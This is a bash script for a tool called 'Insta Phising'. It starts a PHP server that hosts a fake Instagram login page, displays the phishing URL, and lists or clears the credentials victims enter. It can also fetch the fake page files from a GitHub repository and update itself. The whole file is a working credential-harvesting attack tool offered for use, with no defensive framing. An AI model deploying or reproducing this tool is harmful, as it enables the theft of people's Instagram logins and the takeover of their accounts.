#! /bin/bash

l_ip=192.168.1.39
port=1881
active=0
status=off
current_ver=1.0
check_ver=1
a_time=1
# 0 -> Red
# 1 -> Yellow
# 2 -> Green
# 3 -> Cyan
# 4 -> White
# 5 -> Magenta
color=( "\e[91m" "\e[93m" "\e[92m" "\e[96m" "\e[97m" "\e[95m" )
# 0 -> Normal
# 1 -> Bold and bright
# 2 -> Blink
# 3 -> Reset Blink
font_type=( "\e[0m" "\e[1m" "\e[5m" "\e[25m")
# 0 -> Default
# 1 -> Red
# 2 -> LBlue
# 3 -> Blue
# 4 -> Magenta
backg=( "\e[49m" "\e[101m" "\e[104m" "\e[44m" "\e[105m")
function menu(){
    default_setting
    if [ $a_time -eq 1 ]
    then
    ver_control
    a_time=0
    fi
    control_php_status
    clear

    echo -e "${color[4]}┌─────────────────────────────────────┐"
    echo -e "|...:::${backg[2]}     INSTA PHISING       ${backg[0]}:::...|"
    echo -e "|...::${backg[1]}     Author: Kursat K.     ${backg[0]}::...|"
    echo -e "|...:${backg[4]}     github.com/kursatk52    ${backg[0]}:...|"
    echo -e "|-------------> ${font_type[2]}v$current_ver${font_type[3]} <----------------|"
    echo "| 1 - Start Insta Phising Attack      |"
    echo "| 2 - Stop Insta Phising Attack       |"
    echo "| 3 - List Credentials                |"
    echo "| 4 - Clear Credentials               |"    
    echo "| 5 - Show Web Service Informations   |"
    echo "| 6 - Check update                    |" 
    echo "| 7 - Control dependencies            |"
    echo "| 8 - Help Menu                       |"
    echo "| 0 or q - Exit                       |"
    echo "└─────────────────────────────────────┘"
    echo -e "${color[1]}"
    echo    "┌───────────────────────→"
    if [ $status == "on" ]
    then
    echo -e "| #> Server Status: ${color[2]}$status ${color[1]}"
    else
    echo -e "| #> Server Status: ${color[0]}$status ${color[1]}"
    fi
    echo    "└───────────────────────→"
    echo -e "${color[4]}"
    echo -e "\n Select: \c"
}

function cikis(){
    clear
    echo " ...: Exiting. Bye Bye (O_o) :..."
    exit
}

function baslik(){
    echo -e "${backg[2]}....::: $1 :::....${backg[0]}"
}

function sc(){
    # 0 : New line
    
    
    
    case $1 in
        0 )
        echo -e "\n"
    esac
}

function help_menu(){
    clear
    baslik "Help Menu"
    sc 0
    echo -e "For help please visit Github: ${color[3]}https://github.com/kursatk52/insta-phising${color[4]}"

    back_to_menu
}

function back_to_menu(){
    echo    -e "\n─────────────────────────────────────────────────────────────────"
    echo -e " \nPress enter for back to menu! if you want quit, before press ${color[0]}q${color[4]}!!!  \c"
    read answer
    if [ "$answer" == "q" ]
    then
    cikis
    fi
}

function control_php_status(){
    
    result=$(ps aux | grep php | head -n 1)
    if [[ $result == *"$l_ip:$port"* ]]
    then   
        status=on
    else
        status=off
    fi
}

function show_web_serv_info(){
    clear
    baslik "Web Service Informations"
    echo -e "\n${color[0]}IP:  ${color[2]} $l_ip ${color[4]}"
    echo -e "${color[0]}PORT:${color[2]} $port${color[4]}"
    echo -e "\n${color[0]}URL:${color[1]}  http://$l_ip:$port ${color[4]} \n"
    baslik "Credential File Location"
    echo -e "\n ${color[3]}$(pwd)/site/credentials.txt${color[4]}"
    back_to_menu
}

function kill_server(){
    php=$(ps aux | grep php | head -n 1)
    if [[ $php == *"php"* ]]
    then   
        pkill php > /dev/null 2>&1
        killall php > /dev/null 2>&1
        status=off
    fi
    
}

function download_files(){
    baslik "Downloading"
    sudo git clone https://github.com/kursatk52/insta-phising
    sudo rm -r site/
    sudo mv -f insta-phising/* .
    sudo rm -r insta-phising/
}

function start_phising(){
    
    if [ -e "site/login.html" -a -e "site/index_files" -a -e "site/index.php" -a -e "site/login.php" -a -e "config.conf" ]
    then
        clear
        baslik "Start Insta Phising"
        echo -e "\nPlease Enter LHOST (Default $l_ip): \c"
        read ip
        if [ l_ip != "" ] || [ l_ip != " " ]
        then
            echo "o" > /dev/null
        else
            l_ip=$ip
        fi
        echo -e "Please Enter PORT (Default $port): \c"
        read portt
        if [ ip != "" ] || [ ip != " " ]
        then
            echo "o" > /dev/null
        else
            port=$portt
        fi
        clear
        kill_server
        baslik "Start Insta Phising"
        php -S $l_ip:$port -t site/ > /dev/null 2>&1 &
        status=on
        echo -e "Server started...\n"
        baslik "<<< Info >>>"
        echo "LHOST: $l_ip"
        echo "PORT: $port"
        echo -e "\nFake URL: ${color[2]}http://$l_ip:$port/${color[4]}"

        back_to_menu
    else
        status=off
        echo -e "Not found fake instagram page!\nRequire fake instagram page. Are you want download? (y/n): \c"
        read answer
        if [[ $answer == "y" ]]
        then
            download_files
            clear
            baslik "Download Succesfull"
            echo "Download successful !!! Please restart the program."
            sleep 3
            exit
        fi
    fi
    
    
}

function control_dependencies(){
    clear
    baslik "Controlling Dependencies"
    
    #Control php server
    ans=$(command -V php 2>/dev/null)

    if [ "$ans" == "" ]
    then
        echo -e "php:                      ${color[0]}Not Installed${color[4]} (Before install php, please!)"
    else
        echo -e "php:                      ${color[2]}Installed${color[4]} ($(command -v php 2>/dev/null))"
    fi


    #Control fake insta page
    if [ -e "site/login.html" -a -e "site/index_files" -a -e "site/index.php" -a -e "site/login.php" -a -e "config.conf" ]
    then
        echo -e "Fake Insta Page Status:   ${color[2]}Installed${color[4]} ($(pwd)/site/)"
    else
        echo -e "Fake Insta Page Status:   ${color[0]}Not Installed${color[4]} (Not Found!)"
        echo -e "\nNot found fake instagram page!\nRequire fake instagram page. Are you want download? (y/n): \c"
        read answer
        if [ $answer == "y" ]
        then
            download_files
            clear
            baslik "Download Succesfull"
            echo "Download successful !!! Please restart the program."
            sleep 3
            exit
        fi
    fi

     #Control curl
    ans=$(command -V curl 2>/dev/null)

    if [ "$ans" == "" ]
    then
        echo -e "curl:                     ${color[0]}Not Installed${color[4]} (Before install curl, please!)"
    else
        echo -e "curl:                     ${color[2]}Installed${color[4]} ($(command -v curl 2>/dev/null))"
    fi



    #Control git
    ans=$(command -V git 2>/dev/null)

    if [ "$ans" == "" ]
    then
        echo -e "git:                      ${color[0]}Not Installed${color[4]} (Before install git, please!)"
    else
        echo -e "git:                      ${color[2]}Installed${color[4]} ($(command -v git 2>/dev/null))"
    fi
    
     #Control wget
    ans=$(command -V wget 2>/dev/null)

    if [ "$ans" == "" ]
    then
        echo -e "wget:                     ${color[0]}Not Installed${color[4]} (Before install wget, please!)"
    else
        echo -e "wget:                     ${color[2]}Installed${color[4]} ($(command -v wget 2>/dev/null))"
    fi
    

    back_to_menu
}

function list_credentials(){
    clear
    users=$(cat site/credentials.txt 2> /dev/null)
    baslik "Credentials"

    if [[ $users == "" ]]
    then
        echo -e "\n ${color[0]}Users not found!${color[4]}"
    else  
        echo -e "\n$users"
    fi 
    back_to_menu
}

function ver_control(){
    clear
    current_ver=$(sudo cat config.conf 2> /dev/null | head -n 1 | cut -d: -f2) 
    if [ $check_ver -eq 1 ]
    then
        l_ver=$(sudo curl -s https://raw.githubusercontent.com/kursatk52/insta-phising/master/config.conf | head -n 1 | cut -d: -f2)
        if [[ $current_ver == "" ]] || [[ $current_ver == " " ]]
        then
            echo -e "${backg[1]}Files not found! Are you want download? (y/n): \c${backg[0]}"
            read answer
            if [[ $answer == "y" ]]
            then
                download_files
                clear
                baslik "Download Succesfull"
                echo "Download successful !!! Please restart the program."
                sleep 3
                cikis
            else
                cikis
            fi    
        
        elif [[ $current_ver != "$l_ver" ]]
        then
            echo -e "${backg[1]}Version is out of date. Please update the program! ${backg[0]}"
            echo -e "Current Version: $current_ver\nLatest Version: $l_ver"
            echo -e "Are you want update the program?(y/n): \c"
            read answer
            if [[ $answer == "y" ]]
            then
                download_files
                clear
                baslik "Download Succesfull"
                echo "Download successful !!! Please restart the program."
                sleep 3
                cikis
            else
                echo "Version is already latest (v$current_ver)"
                back_to_menu
            fi
        else
            echo "Your program is up to date..."
            if [ $a_time -ne 1 ]
            then
            back_to_menu
            fi
        fi
    else
        echo "!!! Version can't be checked please before change check_ver:0 to 1 !!!"
        if [ $a_time -ne 1 ]
            then
            back_to_menu
        fi
    fi
}

function clear_credentials(){
    clear
    sudo rm -r site/credentials.txt 2> /dev/null
    echo "Credentials cleared ..."
    back_to_menu
}

function default_setting(){
    l_ip=$(cat config.conf | cut -d: -f2 | sed -n 2p 2> /dev/null)
    if [[ $l_ip == " " ]] || [[ $l_ip == "" ]]
    then
        l_ip=127.0.0.1
    fi
    port=$(cat config.conf | cut -d: -f2 | sed -n 3p 2> /dev/null)
    if [[ $port == " " ]] || [[ $port == "" ]]
    then
        port=1881
    fi
    check_ver=$(cat config.conf | cut -d: -f2 | sed -n 4p 2> /dev/null)
    if [[ $check_ver == "" ]] || [[ $check_ver == " " ]]
    then
        check_ver=1
    fi


}


while [ 1 -eq 1 ]
do
    menu
    read cevap
    case $cevap in
        0 )
            cikis;;
        1 )
            start_phising;;
        2 )
            clear
            kill_server;;
        3 )
            list_credentials;;
        4 )
            clear_credentials;;
        5 )
            show_web_serv_info;;
        6 )
            ver_control;;

        7 )
            control_dependencies;;
        8 )
            help_menu;;
        q )
            exit;;
        
    esac
done






